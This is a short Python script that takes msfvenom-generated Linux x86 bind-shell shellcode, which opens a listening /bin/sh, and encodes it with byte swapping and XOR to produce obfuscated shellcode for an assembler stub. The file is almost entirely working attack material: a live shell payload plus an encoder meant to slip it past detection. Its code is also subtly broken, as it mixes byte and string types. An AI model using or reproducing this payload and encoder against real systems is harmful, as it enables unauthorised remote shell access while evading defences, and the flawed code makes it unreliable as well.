#!/usr/env/python3


#Cuustom encrypter for linux x86 bind shell


#msfvenom -p linux/x86/bind_shell_tcp
buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += b"\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51"
buf += b"\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04"
buf += b"\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f"
buf += b"\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f"
buf += b"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode=buf


# intialize variables
encoded_shellcode = ""
encoded_nasm = ""
shellcodeflip=""
if (len(bytearray(shellcode))) % 2 !=0:
	shellcode=shellcode+"\x90"
for i in range(0,len(bytearray(shellcode))-1,2):
	s1=shellcode[i+1]
	s2=shellcode[i]
	
	shellcodeflip=shellcodeflip+s1+s2
	
encshellcode=""
for i in range(0,len(bytearray(shellcodeflip))-1,2) :
	
	for x in bytearray(shellcodeflip[i]) :
		x1=x^0x02
		x1=x1^0x08
	for y in bytearray(shellcodeflip[i+1]):
		y1=y^0x19	
		y1=y1^0x98
	
	encoded_shellcode += "\\x"
	encoded_shellcode += "%02x" %(x1 & 0xff)
	encoded_shellcode += "\\x"
	encoded_shellcode += "%02x" %(y1 & 0xff)
	
	encoded_nasm += "0x"
	encoded_nasm += "%02x," %(x1 & 0xff)
	encoded_nasm += "0x"
	encoded_nasm += "%02x," %(y1 & 0xff)
	
	
print('Encoded shellcode:')
print(encoded_shellcode)

print('Shellcode for nasm:')
print(encoded_nasm)

print('Shellcode Length: %d' % len(bytearray(shellcodeflip)))
